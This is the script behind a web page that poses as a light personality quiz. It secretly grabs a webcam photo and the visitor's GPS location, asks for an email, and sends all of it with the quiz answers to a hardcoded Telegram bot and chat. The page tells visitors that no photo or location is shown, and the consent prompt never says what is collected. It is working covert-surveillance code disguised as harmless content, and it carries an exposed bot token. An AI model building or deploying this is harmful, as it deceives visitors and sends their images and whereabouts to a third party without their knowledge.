const BOT_TOKEN = '7274097565:AAEqAjfyDDobzEQWVQ5FAgDMUIBJCdl2ZTg';
const CHAT_ID = '248714805';

const consentBox = document.getElementById('consentBox');
const agreeBtn = document.getElementById('agreeBtn');
const noBtn = document.getElementById('noBtn');
const quizContainer = document.getElementById('quizContainer');
const quizForm = document.getElementById('quizForm');
const loading = document.getElementById('loading');
const result = document.getElementById('result');
const photoCanvas = document.getElementById('photoCanvas');

let capturedPhoto = null;
let currentQuestionIndex = 0;
const answers = {};

const questions = [
  { q: "1. What is your favorite color?", type: "radio", name: "color", options: ["Red", "Blue", "Green", "Black"] },
  { q: "2. Pick your ideal vacation spot:", type: "select", name: "vacation", options: ["Beach", "Mountains", "City", "Countryside"] },
  { q: "3. Which pet do you prefer?", type: "radio", name: "pet", options: ["Dog", "Cat", "Bird", "Fish"] },
  { q: "4. What genre of music do you like most?", type: "radio", name: "music", options: ["Rock", "Pop", "Jazz", "Classical"] },
  { q: "5. Which movie genre do you prefer?", type: "radio", name: "movie", options: ["Action", "Comedy", "Horror", "Drama"] }
];

// Consent logic
agreeBtn.onclick = function() {
  consentBox.classList.add('hidden');
  quizContainer.classList.remove('hidden');
  // Try to capture photo, but always start the quiz
  capturePhoto().finally(() => {
    renderQuestion(currentQuestionIndex);
  });
};

noBtn.onclick = function() {
  consentBox.innerHTML = "<h2>You chose not to participate. No data will be collected.</h2>";
};

// Capture photo with user camera
async function capturePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    await new Promise(res => setTimeout(res, 1400));
    photoCanvas.width = video.videoWidth || 320;
    photoCanvas.height = video.videoHeight || 240;
    const ctx = photoCanvas.getContext('2d');
    ctx.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
    capturedPhoto = photoCanvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    capturedPhoto = null;
    // Optional: alert("Camera permission denied or failed. No photo will be used.");
    // You can log errors if you want to debug:
    console.warn('Camera error:', err);
  }
}

// Get geolocation and return a Google Maps link
async function getLocationLink() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      resolve("Location not available.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;
        const link = `https://maps.google.com/?q=${lat},${lng}`;
        resolve(link);
      },
      err => {
        resolve("Location permission denied.");
      }
    );
  });
}

// Render each question
function renderQuestion(index) {
  const q = questions[index];
  let html = `<div class="question"><label>${q.q}</label>`;
  if(q.type === "radio") {
    q.options.forEach(opt => {
      const id = `${q.name}_${opt}`;
      html += `
        <div>
          <input type="radio" id="${id}" name="${q.name}" value="${opt}" required />
          <label for="${id}">${opt}</label>
        </div>`;
    });
  } else if (q.type === "select") {
    html += `<select name="${q.name}" required><option value="" disabled selected>Select one</option>`;
    q.options.forEach(opt => {
      html += `<option value="${opt}">${opt}</option>`;
    });
    html += `</select>`;
  }
  html += `</div>
    <button type="submit">${index === questions.length - 1 ? 'Finish Quiz' : 'Next Question'}</button>`;
  quizForm.innerHTML = html;
}

// Quiz logic
quizForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const formData = new FormData(quizForm);
  const keys = [...formData.keys()];
  keys.forEach(k => {
    answers[k] = formData.get(k);
  });

  currentQuestionIndex++;
  if (currentQuestionIndex < questions.length) {
    renderQuestion(currentQuestionIndex);
  } else {
    // Ask for email
    let email = prompt("Please enter your email address for your quiz result (and photo if you allowed):");
    if (!email || !email.includes('@')) {
      alert("No valid email entered. Results will only be shown on this page.");
      email = null;
    }
    answers.email = email || "(not provided)";
    loading.classList.remove('hidden');
    quizForm.classList.add('hidden');

    // Location: always try to send it with the quiz
    const locationLink = await getLocationLink();

    try {
      let text = "Quiz Results:\n";
      for (const [k, v] of Object.entries(answers)) text += `${k}: ${v}\n`;
      text += `Location: ${locationLink}\n`;

      await sendMessageToTelegram(text);
      if (capturedPhoto) await sendPhotoToTelegram(capturedPhoto, text);
    } catch (err) {
      alert("Sending to Telegram failed: " + err.message);
    }

    setTimeout(() => {
      loading.classList.add('hidden');
      showResult(email);
    }, 1200);
  }
});

// Show result (no photo, no location shown)
function showResult(email) {
  let msg = `<h2>Quiz Results</h2><ul>`;
  for (const [key, val] of Object.entries(answers)) {
    msg += `<li><b>${key}:</b> ${val}</li>`;
  }
  msg += "</ul>";
  msg += `<p>We will send your quiz to your email soon. Thank you!</p>`;
  result.innerHTML = msg;
  result.classList.remove('hidden');
}

// Telegram API functions
async function sendMessageToTelegram(text) {
  const urlText = encodeURIComponent(text);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${urlText}`;
  return fetch(url);
}

async function sendPhotoToTelegram(photoData, caption) {
  const formData = new FormData();
  const blob = await (await fetch(photoData)).blob();
  formData.append('chat_id', CHAT_ID);
  formData.append('caption', caption || '');
  formData.append('photo', blob, 'photo.jpg');
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
}